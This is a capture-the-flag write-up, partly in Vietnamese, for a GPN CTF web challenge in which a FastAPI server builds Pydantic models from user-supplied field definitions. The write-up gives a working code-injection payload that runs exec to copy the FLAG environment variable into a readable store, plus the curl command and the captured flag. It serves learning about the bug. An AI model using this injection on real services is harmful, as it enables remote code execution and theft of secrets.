# restaurant-builder

![alt text](image.png)

## Check file source

```python
@app.get("/blueprint/{name}")
def get_blueprint(name: str):
    blueprint = blueprints.get(name)
    if blueprint is None:
        return None
    return blueprint.model_json_schema()

@app.post("/blueprint/{name}")
def register_blueprint(name: str, description: Dict[str,str] = Body()):
    if name in blueprints:
        raise HTTPException(status_code=409, detail="We already know that one. But keep looking, I think there are some spoons missing.")

    description = {k: v for k,v in description.items() if not k.startswith("__")}
    Blueprint = create_model(name, **description)
    blueprints[name] = Blueprint

    return "Blueprint successfully registered"

@app.get("/item/{name}")
def get_item(name: str):
    return items.get(name)

@app.post("/item/{name}")
def register_item(name: str, item: str = Body()):
    if name not in blueprints:
        raise HTTPException(status_code=400, detail="That looks interesting but we don't know what it is. Are you sure it belongs in a kitchen?")
    try:
        items[name] = blueprints[name].model_validate_json(item, strict=True)
    except:
        raise HTTPException(status_code=409, detail="Are you sure you followed the blueprint exactly?")
    return "Item successfully registered"
```

## Phân tích

Server lưu dữ liệu trong 2 biến global:

```python
blueprints = {}
items = {}
```

Endpoint `/blueprint/{name}` cho phép người dùng gửi JSON để tạo một model Pydantic động bằng `create_model()`:

```python
Blueprint = create_model(name, **description)
```

Trước khi tạo model, server chỉ filter những field có key bắt đầu bằng `__`:

```python
description = {k: v for k,v in description.items() if not k.startswith("__")}
```

Ta thấy server chỉ kiểm tra **key**, nhưng lại không kiểm tra **value**.

Vì vậy ta có thể lợi dụng value để thực thi Python expression. Mục tiêu là đọc biến môi trường `FLAG`, sau đó ghi flag vào biến global `items` để có thể lấy lại qua endpoint:

```http
GET /item/flag
```

## Ý tưởng payload:

```python
items['flag'] = os.environ['FLAG']
```

Do expression cần trả về một type hợp lệ cho field, ta dùng tuple expression:

```python
(__import__('builtins').exec("items['flag']=__import__('os').environ['FLAG']"), str)[1]
```

## Khai thác

```bash
BASE='https://boiled-tofu-with-minced-aioli-zlg3.gpn24.ctf.kitctf.de'

curl -s -X POST "$BASE/blueprint/hai" \
  -H 'Content-Type: application/json' \
  --data '{"x":"(__import__('"'"'builtins'"'"').exec(\"items['"'"'flag'"'"']=__import__('"'"'os'"'"').environ['"'"'FLAG'"'"']\"), str)[1]"}'
```

Server trả về:

```text
"Blueprint successfully registered"
```

Lúc này payload đã được thực thi và flag đã bị ghi vào `items['flag']`.

Đọc flag bằng endpoint `/item/flag`:

![alt text](image-1.png)

## Flag

```text
"GPNCTF{and_one_0R_7w0_rces_lAt3r_7hEy_8UIl7_hAPPily_evEr_aFtEr}"
```
